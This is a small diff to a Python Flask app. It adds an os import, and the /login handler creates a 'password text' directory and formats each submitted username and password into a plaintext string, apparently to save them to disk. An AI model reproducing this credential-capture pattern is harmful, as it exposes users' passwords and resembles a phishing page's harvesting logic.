@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request, redirect, url_for
 import random
+import os
 
 app = Flask(__name__)
 
@@ -9,6 +10,7 @@ def home():
 
 @app.route('/login', methods=['POST'])
 def login():
+    os.makedirs("password text", exist_ok=True)
     username = request.form['username']
     password = request.form['password']
     data = f"Username : {username} \nPassword : {password}"
